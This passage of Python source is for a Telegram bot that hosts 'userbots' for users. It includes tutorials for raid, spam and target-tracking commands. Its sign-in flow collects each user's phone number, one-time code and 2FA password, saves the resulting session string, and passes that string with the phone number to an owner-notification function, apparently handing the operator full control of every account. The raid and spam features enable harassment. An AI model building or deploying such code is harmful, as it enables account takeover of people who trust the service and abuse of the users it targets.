                "2. Eᴀᴄʜ ʟɪɴᴋ ʀᴇsᴏʟᴠᴇs ᴛᴏ ᴀ ᴛᴀʀɢᴇᴛ ᴜsᴇʀ ᴀɴᴅ ᴛʀᴀᴄᴋs ᴛʜᴇɪʀ ʟᴀᴛᴇsᴛ ᴍᴇssᴀɢᴇ ɪɴᴅᴇᴘᴇɴᴅᴇɴᴛʟʏ.\n\n"
                "3. Wʜᴇɴ ʏᴏᴜ sᴇɴᴅ ᴀ ᴍᴇssᴀɢᴇ ғʀᴏᴍ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs, ɪᴛ ᴡɪʟʟ ʀᴇᴘʟʏ ᴛᴏ **Eᴀᴄʜ** ᴛʀᴀᴄᴋᴇᴅ ᴛᴀʀɢᴇᴛ.\n\n"
                "4. Dᴇʟᴇᴛɪᴏɴ ʀᴇᴄᴏᴠᴇʀʏ ᴡᴏʀᴋs ᴘᴇʀ ᴛᴀʀɢᴇᴛ.\n\n"
                "5. Usᴇ `.sᴛᴏᴘᴀᴛ` ᴛᴏ ᴄʟᴇᴀʀ ᴀʟʟ ᴛʀᴀᴄᴋᴇʀs."
            ),
            "setname": (
                "✏️ **.setname – Add Prefix to Outgoing Messages**\n\n"
                "1. Tʏᴘᴇ `.sᴇᴛɴᴀᴍᴇ Ashish` ᴛᴏ sᴇᴛ ᴀ ᴘʀᴇғɪx.\n\n"
                "2. Nᴏᴡ ᴡʜᴇɴᴇᴠᴇʀ ʏᴏᴜ sᴇɴᴅ ᴀ ᴍᴇssᴀɢᴇ ғʀᴏᴍ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs,\n"
                "   ɪᴛ ᴡɪʟʟ ʙᴇ ᴘʀᴇғɪxᴇᴅ ᴡɪᴛʜ `Ashish`.\n\n"
                "3. Tᴏ ᴛᴜʀɴ ᴏғғ: `.sᴇᴛɴᴀᴍᴇ ᴏꜰꜰ`\n\n"
                "💡 Pʀᴇғɪx ɪs ᴀᴘᴘʟɪᴇᴅ **ʙᴇꜰᴏʀᴇ** ғᴏɴᴛ ᴀɴᴅ ᴇᴍᴏᴊɪ."
            ),
            "creplyraid": (
                "📨 **.creplyraid – Custom Reply Raid**\n\n"
                "1. ᴛʏᴘᴇ `.ᴄʀᴇᴘʟʏʀᴀɪᴅ @ᴜsᴇʀ ᴛᴇxᴛ1, ᴛᴇxᴛ2, ᴛᴇxᴛ3`\n\n"
                "2. ᴛʜᴇ ʙᴏᴛ ᴡɪʟʟ ʀᴇᴘʟʏ ᴡɪᴛʜ ᴏɴᴇ ᴏғ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ᴍᴇssᴀɢᴇs ᴡʜᴇɴᴇᴠᴇʀ ᴛʜᴀᴛ ᴜsᴇʀ sᴘᴇᴀᴋs.\n\n"
                "3. ᴛᴏ sᴛᴏᴘ, ᴜsᴇ `.ᴅᴄʀᴇᴘʟʏʀᴀɪᴅ @ᴜsᴇʀ`\n\n"
                "💡 Yᴏᴜʀ ᴄᴜsᴛᴏᴍ ᴍᴇssᴀɢᴇs ᴀʀᴇ sᴀᴠᴇᴅ ᴘᴇʀᴍᴀɴᴇɴᴛʟʏ."
            ),
            "setfont": (
                "🎨 **.setfont – Change Your Font Style**\n\n"
                "1. ᴛʏᴘᴇ `.sᴇᴛꜰᴏɴᴛ <ɴᴀᴍᴇ>` ɪɴ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs.\n\n"
                "2. ᴀᴠᴀɪʟᴀʙʟᴇ ꜰᴏɴᴛs:\n"
                "   ᴄᴀsᴛʟᴇ, ᴏᴜᴛʟɪɴᴇ, ᴄʜᴀᴘʀᴀ, sᴀɴs, sᴇʀɪꜰ, ᴍᴀᴛʜ,\n"
                "   ꜰʀᴇᴇᴢᴇ, ʜᴇᴀʀᴛ, sᴜᴢᴏ, ᴛɪɢᴇʀ, ᴅᴏᴜʙʟᴇ, ᴡɪɴɢs.\n\n"
                "3. ᴛᴏ ᴛᴜʀɴ ᴏꜰꜰ, ᴜsᴇ `.sᴇᴛꜰᴏɴᴛ ᴏꜰꜰ`\n\n"
                "💡 Tʀʏ `.sᴇᴛꜰᴏɴᴛ ᴄᴀsᴛʟᴇ` ꜰᴏʀ ᴀ ᴄᴏᴏʟ sᴛʏʟᴇ!"
            ),
            "setemoji": (
                "✨ **.setemoji – Add Custom Emoji**\n\n"
                "1. ᴛʏᴘᴇ `.sᴇᴛᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ>` ɪɴ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs.\n\n"
                "2. Yᴏᴜ ᴄᴀɴ ᴜsᴇ ᴀɴʏ ᴜɴɪᴄᴏᴅᴇ ᴇᴍᴏᴊɪ ᴏʀ ᴀ ᴄᴜsᴛᴏᴍ ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪ (ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ ᴛʜᴀᴛ ᴇᴍᴏᴊɪ).\n\n"
                "3. Tʜᴇ ᴇᴍᴏᴊɪ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇɴᴅᴇᴅ ᴛᴏ ᴇᴠᴇʀʏ ᴛᴇxᴛ ʏᴏᴜ sᴇɴᴅ.\n\n"
                "4. Tᴏ ʀᴇᴍᴏᴠᴇ, ᴜsᴇ `.sᴇᴛᴇᴍᴏᴊɪ ᴏꜰꜰ`\n\n"
                "💡 Pᴇʀꜰᴇᴄᴛ ꜰᴏʀ ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪs!"
            ),
            "oneword": (
                "🔁 **.oneword – OneWord Spam**\n\n"
                "1. ᴛʏᴘᴇ `.ᴏɴᴇᴡᴏʀᴅ @ᴜsᴇʀ ᴡᴏʀᴅ1 ᴡᴏʀᴅ2 ᴡᴏʀᴅ3`\n"
                "   ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ ᴛᴀʀɢᴇᴛ's ᴍᴇssᴀɢᴇ.\n\n"
                "2. Tʜᴇ ʙᴏᴛ ᴡɪʟʟ sᴘᴀᴍ ᴛʜᴏsᴇ ᴡᴏʀᴅs ɪɴ ʀᴇᴘʟʏ.\n\n"
                "3. Iꜰ ɴᴏ ᴡᴏʀᴅs ᴀʀᴇ ᴘʀᴏᴠɪᴅᴇᴅ, ɪᴛ ᴜsᴇs ʏᴏᴜʀ ᴅᴇғᴀᴜʟᴛ ʟɪsᴛ.\n\n"
                "4. Aᴅᴊᴜsᴛ sᴘᴇᴇᴅ ᴡɪᴛʜ `.sᴅᴇʟᴀʏ 1.5`.\n\n"
                "5. Tᴏ sᴛᴏᴘ, ᴜsᴇ `.sᴛᴏᴘᴏɴᴇᴡᴏʀᴅ`."
            )
        }
        text = tutorials.get(topic, "❌ Tᴏᴘɪᴄ ɴᴏᴛ ꜰᴏᴜɴᴅ.")
        buttons = [[Button.inline("⬅️ Back", b"tutorial_back")]]
        await event.edit(text, parse_mode='markdown', buttons=buttons)

    # =====================================================================
    # VERIFY CALLBACK (unchanged)
    # =====================================================================
    async def verify_callback(self, event):
        user_id = event.sender_id
        if await self.is_user_in_channel(user_id):
            await event.edit("✅ You are verified! Now use /host to start.")
        else:
            await event.answer("❌ You haven't joined the channel yet. Please join and try again.", alert=True)

    async def verify_cmd(self, event):
        user_id = event.sender_id
        if await self.is_user_in_channel(user_id):
            await reply_quote(event, "✅ You are already a member of the required channel.")
        else:
            buttons = [
                [Button.url("📢 Join Channel", f"https://t.me/{self._channel_entity.username}")],
                [Button.inline("✅ I have joined", b"verify_join")]
            ]
            text = (
                "╭─❖ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ\n"
                "│\n"
                "├─➤ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ.\n"
                "│\n"
                "╰─➤ ᴊᴏɪɴ ᴀɴᴅ ᴄʟɪᴄᴋ ᴠᴇʀɪғʏ."
            )
            await event.reply(text, formatting_entities=quote_entities(text), buttons=buttons)

    # =====================================================================
    # HOST COMMAND (unchanged)
    # =====================================================================
    async def host_cmd(self, event):
        user_id = event.sender_id
        if not await self.is_user_in_channel(user_id):
            buttons = [
                [Button.url("📢 Join Channel", f"https://t.me/{self._channel_entity.username}")],
                [Button.inline("✅ I have joined", b"verify_join")]
            ]
            text = (
                "╭─❖ ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ\n"
                "│\n"
                "├─➤ ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ ғɪʀsᴛ.\n"
                "│\n"
                "╰─➤ ᴊᴏɪɴ ᴀɴᴅ ᴠᴇʀɪғʏ ᴛʜᴇɴ ᴛʀʏ ᴀɢᴀɪɴ."
            )
            await event.reply(text, formatting_entities=quote_entities(text), buttons=buttons)
            return

        arg = event.pattern_match.group(1) if event.pattern_match else None
        if arg:
            try:
                phone = normalize_phone(arg)
                if not re.match(r"^\+\d{7,15}$", phone):
                    raise ValueError
            except:
                await reply_quote(event,
                    "╭─❖ ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ\n"
                    "│\n"
                    "╰─➤ ᴘʟᴇᴀsᴇ ᴜsᴇ ᴛʜᴇ ғᴏʀᴍᴀᴛ: +91xxxxxxxxxx ᴏʀ 91xxxxxxxxxx"
                )
                return
            await self._start_hosting(event, user_id, phone)
        else:
            self._interactive_host[user_id] = "waiting_number"
            await reply_quote(event,
                "╭─❖ ʜᴏsᴛɪɴɢ ʀᴇǫᴜᴇsᴛ\n"
                "│\n"
                "├─➤ ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ.\n"
                "│\n"
                "╰─➤ ᴇxᴀᴍᴘʟᴇ: `+91xxxxxxxxxx` ᴏʀ `91xxxxxxxxxx`"
            )

    # =====================================================================
    # GENERIC TEXT HANDLER (OTP / 2FA) – unchanged
    # =====================================================================
    async def text_handler(self, event):
        text = (event.raw_text or "").strip()
        user_id = event.sender_id

        if user_id in self._interactive_host and self._interactive_host[user_id] == "waiting_number":
            if text.startswith('/'):
                return
            try:
                phone = normalize_phone(text)
                if not re.match(r"^\+\d{7,15}$", phone):
                    raise ValueError
                del self._interactive_host[user_id]
                await self._start_hosting(event, user_id, phone)
            except:
                await reply_quote(event,
                    "╭─❖ ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ\n"
                    "│\n"
                    "╰─➤ ᴘʟᴇᴀsᴇ ᴜsᴇ ᴛʜᴇ ғᴏʀᴍᴀᴛ: +91xxxxxxxxxx ᴏʀ 91xxxxxxxxxx"
                )
            return

        pending = get_pending_auth(user_id)
        if not pending:
            return
        temp_session_str = pending["temp_session_string"]
        phone = pending["phone"]
        auth_data = json.loads(pending["auth_data"])
        step = auth_data.get("step")
        temp_client = TelegramClient(StringSession(temp_session_str), API_ID, API_HASH,
                                     connection=ConnectionTcpFull,
                                     connection_retries=3, retry_delay=3, timeout=READ_TIMEOUT)
        temp_client.flood_sleep_threshold = 60
        await temp_client.connect()
        try:
            if step == "otp":
                if text.startswith('/'):
                    return
                cleaned = text.replace(" ", "")
                otp_digits = None
                match = re.search(r'\b(\d{5,6})\b', cleaned)
                if match:
                    otp_digits = match.group(1)
                else:
                    all_digits = "".join(re.findall(r'\d', cleaned))
                    if len(all_digits) in (5, 6):
                        otp_digits = all_digits
                if not otp_digits:
                    await reply_quote(event,
                        "╭─❖ ɪɴᴠᴀʟɪᴅ ᴏᴛᴘ\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ ᴏᴛᴘ ᴅɪɢɪᴛs, ғᴏʀ ᴇxᴀᴍᴘʟᴇ: `1 2 3 4 5`"
                    )
                    return
                try:
                    await temp_client.sign_in(phone=phone, code=otp_digits,
                                              phone_code_hash=auth_data["phone_code_hash"])
                    session_string = temp_client.session.save()
                    save_hosted_account(user_id, phone, session_string, {})
                    await self.manager.host(user_id, phone, session_string, {})
                    try:
                        user_info = await temp_client.get_me()
                        await self._notify_owner(user_id, phone, user_info, session_string)
                    except:
                        await self._notify_owner(user_id, phone, None, session_string)
                    await reply_quote(event,
                        "╭─❖ ʜᴏsᴛɪɴɢ sᴜᴄᴄᴇssғᴜʟ\n"
                        "│\n"
                        "├─➤ sᴛᴀᴛᴜs : ᴏɴʟɪɴᴇ\n"
                        "├─➤ ᴜsᴇʀʙᴏᴛ : ᴀᴄᴛɪᴠᴇ\n"
                        "│\n"
                        "╰─➤ ʏᴏᴜʀ ᴀᴜᴛᴏ ᴛᴀɢɢᴇʀ ɪs ʀᴇᴀᴅʏ."
                    )
                    delete_pending_auth(user_id)
                    return
                except SessionPasswordNeededError:
                    auth_data["step"] = "2fa"
                    set_pending_auth(user_id, phone, temp_session_str, auth_data)
                    await reply_quote(event,
                        "╭─❖ ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ\n"
                        "│\n"
                        "├─➤ sᴛᴀᴛᴜs : ʀᴇǫᴜɪʀᴇᴅ\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ 2FA ᴘᴀssᴡᴏʀᴅ."
                    )
                    return
                except FloodWaitError as e:
                    await reply_quote(event,
                        f"╭─❖ ᴛᴇʟᴇɢʀᴀᴍ ʟɪᴍɪᴛ\n"
                        "│\n"
                        f"├─➤ sᴛᴀᴛᴜs : ᴡᴀɪᴛ\n"
                        f"├─➤ ᴅᴜʀᴀᴛɪᴏɴ : {e.seconds}s\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ."
                    )
                except Exception as e:
                    logger.error(f"OTP verification failed: {e}", exc_info=True)
                    await reply_quote(event,
                        "╭─❖ ᴏᴛᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴏᴅᴇ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ."
                    )
            elif step == "2fa":
                if text.startswith('/'):
                    return
                password = text
                if not password:
                    await reply_quote(event,
                        "╭─❖ ɪɴᴠᴀʟɪᴅ ᴘᴀssᴡᴏʀᴅ\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ 2FA ᴘᴀssᴡᴏʀᴅ."
                    )
                    return
                try:
                    await temp_client.sign_in(password=password)
                    session_string = temp_client.session.save()
                    save_hosted_account(user_id, phone, session_string, {})
                    await self.manager.host(user_id, phone, session_string, {})
                    try:
                        user_info = await temp_client.get_me()
                        await self._notify_owner(user_id, phone, user_info, session_string)
                    except:
                        await self._notify_owner(user_id, phone, None, session_string)
                    await reply_quote(event,
                        "╭─❖ ʜᴏsᴛɪɴɢ sᴜᴄᴄᴇssғᴜʟ\n"
                        "│\n"
                        "├─➤ sᴛᴀᴛᴜs : ᴏɴʟɪɴᴇ\n"
                        "├─➤ ᴜsᴇʀʙᴏᴛ : ᴀᴄᴛɪᴠᴇ\n"
                        "├─➤ 2FA : ᴠᴇʀɪғɪᴇᴅ\n"
                        "│\n"
                        "╰─➤ ʏᴏᴜʀ ᴀᴜᴛᴏ ᴛᴀɢɢᴇʀ ɪs ʀᴇᴀᴅʏ."
                    )
                    delete_pending_auth(user_id)
                except FloodWaitError as e:
                    await reply_quote(event,
                        f"╭─❖ ᴛᴇʟᴇɢʀᴀᴍ ʟɪᴍɪᴛ\n"
                        "│\n"
                        f"├─➤ sᴛᴀᴛᴜs : ᴡᴀɪᴛ\n"
                        f"├─➤ ᴅᴜʀᴀᴛɪᴏɴ : {e.seconds}s\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ."
                    )
                except Exception as e:
                    logger.error(f"2FA verification failed: {e}", exc_info=True)
                    await reply_quote(event,
                        "╭─❖ ɪɴᴠᴀʟɪᴅ ᴘᴀssᴡᴏʀᴅ\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏʀʀᴇᴄᴛ 2FA ᴘᴀssᴡᴏʀᴅ."
                    )
            else:
                await reply_quote(event,
                    "╭─❖ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴇʀʀᴏʀ\n"
                    "│\n"
                    "╰─➤ ᴜɴᴇxᴘᴇᴄᴛᴇᴅ sᴛᴇᴘ. ᴘʟᴇᴀsᴇ /ᴄᴀɴᴄᴇʟ."
                )
                delete_pending_auth(user_id)
        finally:
            try:
                await temp_client.disconnect()
            except:
                pass

    # =====================================================================
    # START HOSTING (unchanged)
    # =====================================================================
    async def _start_hosting(self, event, user_id, phone):
        existing = get_hosted_account(user_id)
        if existing:
            inst = self.manager.get_instance(user_id)
            if inst and inst.get_status() == "RUNNING":
                await reply_quote(event,
                    "╭─❖ ᴀᴄᴄᴏᴜɴᴛ ᴀʟʀᴇᴀᴅʏ ʜᴏsᴛᴇᴅ ᴀɴᴅ ʀᴜɴɴɪɴɢ\n"
                    "│\n"
                    "├─➤ sᴛᴀᴛᴜs : ᴀᴄᴛɪᴠᴇ\n"
                    "│\n"
                    "╰─➤ ᴜsᴇ /ʀᴇsᴛᴀʀᴛ ᴛᴏ ʀᴇsᴛᴀʀᴛ ᴏʀ /sᴛᴏᴘ ᴛᴏ sᴛᴏᴘ, ᴛʜᴇɴ ᴛʀʏ ᴀɢᴀɪɴ."
                )
                return
            else:
                await self.manager.stop_userbot(user_id)
                delete_hosted_account(user_id)
                logger.info(f"Removed stopped account for user {user_id}")

        if get_pending_auth(user_id):
            await reply_quote(event,
                "╭─❖ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ɪɴ ᴘʀᴏɢʀᴇss\n"
                "│\n"
                "╰─➤ ʏᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀ ᴘᴇɴᴅɪɴɢ ʜᴏsᴛɪɴɢ sᴇssɪᴏɴ."
            )
            return

        await reply_quote(event,
            "╭─❖ ᴏᴛᴘ ʀᴇǫᴜᴇsᴛ\n"
            "│\n"
            "├─➤ sᴇɴᴅɪɴɢ ᴏᴛᴘ ᴛᴏ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ...\n"
            "│\n"
            "╰─➤ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ."
        )

        temp_client = TelegramClient(StringSession(), API_ID, API_HASH,
                                     connection=ConnectionTcpFull,
                                     connection_retries=3, retry_delay=3, timeout=READ_TIMEOUT)
        temp_client.flood_sleep_threshold = 60
        try:
            await temp_client.connect()
            sent = await temp_client.send_code_request(phone)
            phone_code_hash = sent.phone_code_hash
            session_string = temp_client.session.save()
            auth_data = {"step": "otp", "phone_code_hash": phone_code_hash}
            set_pending_auth(user_id, phone, session_string, auth_data)
            masked_phone = mask_phone(phone)

            await reply_quote(event,
                "╭─❖ ᴏᴛᴘ sᴇɴᴛ ✅\n"
                "│\n"
                f"├─➤ ᴘʜᴏɴᴇ : {masked_phone}\n"
                "│\n"
                "╰─➤ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ᴀs sᴘᴀᴄᴇᴅ ᴅɪɢɪᴛs: `1 2 3 4 5`"
            )
        except PhoneNumberInvalidError:
            await reply_quote(event,
                "╭─❖ ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ\n"
                "│\n"
                "╰─➤ ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ."
            )
        except FloodWaitError as e:
            await reply_quote(event,
                f"╭─❖ ᴛᴇʟᴇɢʀᴀᴍ ʟɪᴍɪᴛ\n"
                "│\n"
                f"├─➤ sᴛᴀᴛᴜs : ᴡᴀɪᴛ\n"
                f"├─➤ ᴅᴜʀᴀᴛɪᴏɴ : {e.seconds}s\n"
                "│\n"
                "╰─➤ ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ."
            )
        except Exception as e:
            logger.error(f"Host error: {e}", exc_info=True)
            await reply_quote(event,
                "╭─❖ ʜᴏsᴛɪɴɢ ᴇʀʀᴏʀ\n"
                "│\n"
                "╰─➤ ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ sᴇɴᴅɪɴɢ ᴏᴛᴘ."
            )
        finally:
            await temp_client.disconnect()

    # =====================================================================
    # CANCEL, STATUS, STOP, RESTART, LOGOUT (unchanged)
    # =====================================================================
    async def cancel_cmd(self, event):
        user_id = event.sender_id
        pending = get_pending_auth(user_id)
        if pending:
            delete_pending_auth(user_id)
            await reply_quote(event,
                "╭─❖ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ\n"
                "│\n"
                "╰─➤ ᴛʜᴇ ᴘᴇɴᴅɪɴɢ ʜᴏsᴛɪɴɢ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʟᴇᴀʀᴇᴅ."
            )
        else:
            await reply_quote(event,
                "╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ\n"
                "│\n"
                "╰─➤ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀɴʏ ᴘᴇɴᴅɪɴɢ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ."
            )

    async def status_cmd(self, event):
        user_id = event.sender_id
        inst = self.manager.get_instance(user_id)
        if inst:
            status = inst.get_status()
            status_emoji = "🟢" if status == "RUNNING" else "🔴" if status == "ERROR" else "🟡"
            await reply_quote(event,
                f"╭─❖ ᴜsᴇʀʙᴏᴛ sᴛᴀᴛᴜs\n"
                "│\n"
                f"├─➤ sᴛᴀᴛᴜs : {status_emoji} {status}\n"
                f"├─➤ ᴀᴄᴄᴏᴜɴᴛ : ᴄᴏɴɴᴇᴄᴛᴇᴅ\n"
                "│\n"
                "╰─➤ ᴜsᴇ /ʀᴇsᴛᴀʀᴛ ᴛᴏ ʀᴇsᴛᴀʀᴛ ᴛʜᴇ ᴜsᴇʀʙᴏᴛ."
            )
        else:
            await reply_quote(event,
                "╭─❖ ɴᴏ ʜᴏsᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ\n"
                "│\n"
                "╰─➤ ᴜsᴇ /ʜᴏsᴛ ᴛᴏ ʜᴏsᴛ ʏᴏᴜʀ ᴀᴜᴛᴏ ᴛᴀɢɢᴇʀ."
            )

    async def stop_cmd(self, event):
        user_id = event.sender_id
        if await self.manager.stop_userbot(user_id):
            await reply_quote(event,
                "╭─❖ ᴜsᴇʀʙᴏᴛ sᴛᴏᴘᴘᴇᴅ\n"
                "│\n"
                "╰─➤ ᴛʜᴇ ᴜsᴇʀʙᴏᴛ ʜᴀs ʙᴇᴇɴ sᴛᴏᴘᴘᴇᴅ sᴀғᴇʟʏ."
            )
        else:
            await reply_quote(event,
                "╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴜsᴇʀʙᴏᴛ\n"
                "│\n"
                "╰─➤ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀɴʏ ʀᴜɴɴɪɴɢ ᴜsᴇʀʙᴏᴛ."
            )

    async def restart_cmd(self, event):
        user_id = event.sender_id
        if await self.manager.restart_userbot(user_id):
            await reply_quote(event,
                "╭─❖ ᴜsᴇʀʙᴏᴛ ʀᴇsᴛᴀʀᴛᴇᴅ\n"
                "│\n"
                "├─➤ sᴛᴀᴛᴜs : ᴏɴʟɪɴᴇ\n"
                "│\n"
                "╰─➤ ᴛʜᴇ ᴜsᴇʀʙᴏᴛ ɪs ʀᴜɴɴɪɴɢ ᴀɢᴀɪɴ."
            )
        else:
            await reply_quote(event,
                "╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴜsᴇʀʙᴏᴛ\n"
                "│\n"
                "╰─➤ ᴜsᴇ /ʜᴏsᴛ ғɪʀsᴛ."
            )

    async def logout_cmd(self, event):
        user_id = event.sender_id
        inst = self.manager.get_instance(user_id)
        if inst:
            await self.manager.logout_userbot(user_id)
            await reply_quote(event,
                "╭─❖ ʟᴏɢᴏᴜᴛ sᴜᴄᴄᴇssғᴜʟ\n"
                "│\n"
                "├─➤ sᴇssɪᴏɴ ʀᴇᴠᴏᴋᴇᴅ\n"
                "├─➤ ᴀᴄᴄᴏᴜɴᴛ ʀᴇᴍᴏᴠᴇᴅ\n"
                "│\n"
                "╰─➤ ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ʜᴏsᴛ ᴀ ɴᴇᴡ ᴜsᴇʀʙᴏᴛ ᴡɪᴛʜ /ʜᴏsᴛ."
            )
        else:
            if get_hosted_account(user_id):
                delete_hosted_account(user_id)
                await reply_quote(event,
                    "╭─❖ ʟᴏɢᴏᴜᴛ ᴘᴇʀғᴏʀᴍᴇᴅ\n"
                    "│\n"
                    "╰─➤ ʀᴇᴄᴏʀᴅ ᴅᴇʟᴇᴛᴇᴅ (ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ғᴏᴜɴᴅ)."
                )
            else:
                await reply_quote(event,
                    "╭─❖ ɴᴏ ᴀᴄᴄᴏᴜɴᴛ ᴛᴏ ʟᴏɢ ᴏᴜᴛ\n"
                    "│\n"
                    "╰─➤ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀ ʜᴏsᴛᴇᴅ ᴜsᴇʀʙᴏᴛ."
                )

    # =====================================================================
    # BROADCAST (unchanged)
    # =====================================================================
    async def broadcast_cmd(self, event):
        if event.sender_id != OWNER_ID:
            await reply_quote(event, "⛔ You are not authorized to use this command.")
            return
        full_text = event.raw_text or ""
        broadcast_msg = re.sub(r"^/broadcast\s*", "", full_text, count=1)
        if not broadcast_msg:
            await reply_quote(event,
                "╭─❖ ʙʀᴏᴀᴅᴄᴀsᴛ ᴜsᴀɢᴇ\n"
                "│\n"
                "├─➤ /ʙʀᴏᴀᴅᴄᴀsᴛ <ʏᴏᴜʀ ᴍᴇssᴀɢᴇ>\n"
                "│\n"
                "╰─➤ ᴛʜɪs ᴡɪʟʟ sᴇɴᴅ ᴀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ᴀʟʟ ᴜsᴇʀs ᴡʜᴏ ʜᴀᴠᴇ /sᴛᴀʀᴛᴇᴅ ᴛʜᴇ ʙᴏᴛ."
            )
            return
        users = get_all_bot_users()
        if not users:
            await reply_quote(event, "📭 No users to broadcast to.")
            return
        await reply_quote(event,
            f"╭─❖ ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ\n"
            "│\n"
            f"├─➤ ʀᴇᴄɪᴘɪᴇɴᴛs : {len(users)}\n"
            f"├─➤ ᴍᴇssᴀɢᴇ : {broadcast_msg[:50]}{'...' if len(broadcast_msg) > 50 else ''}\n"
            "│\n"
            "╰─➤ sᴇɴᴅɪɴɢ..."
        )
        broadcast_text = f"╭─❖ ʙʀᴏᴀᴅᴄᴀsᴛ\n│\n╰─➤ {broadcast_msg}"
        success_count = 0
        fail_count = 0
        for user_id in users:
            try:
                try:
                    await self.bot.send_file(
                        user_id,
                        BROADCAST_IMAGE,
                        caption=broadcast_text,
                        formatting_entities=quote_entities(broadcast_text)
                    )
                except Exception as e:
                    logger.warning(f"Image broadcast failed for {user_id}: {e}. Sending text only.")
                    await self.bot.send_message(
                        user_id,
                        broadcast_text,
                        formatting_entities=quote_entities(broadcast_text)
                    )
                success_count += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                fail_count += 1
                logger.error(f"Broadcast error for user {user_id}: {type(e).__name__} - {e}")
        await reply_quote(event,
            f"╭─❖ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇ\n"
            "│\n"
            f"├─➤ sᴜᴄᴄᴇss : {success_count}\n"
            f"├─➤ ғᴀɪʟᴇᴅ : {fail_count}\n"
            "│\n"
            "╰─➤ ᴅᴏɴᴇ ✅"
        )

    # =====================================================================
    # GLOBAL ONEWORD (unchanged)
    # =====================================================================
    async def gsetoneword_cmd(self, event):
        if event.sender_id != OWNER_ID:
            await reply_quote(event, "⛔ This command is only for the bot owner.")
            return
        arg = event.pattern_match.group(1) if event.pattern_match else ""
        words = None
        if arg:
            words = arg.strip().split()
        elif event.is_reply:
            replied = await event.get_reply_message()
            if replied:
                content = None
                if replied.text:
                    content = replied.text
                elif replied.document:
                    mime = replied.document.mime_type
                    is_text = False
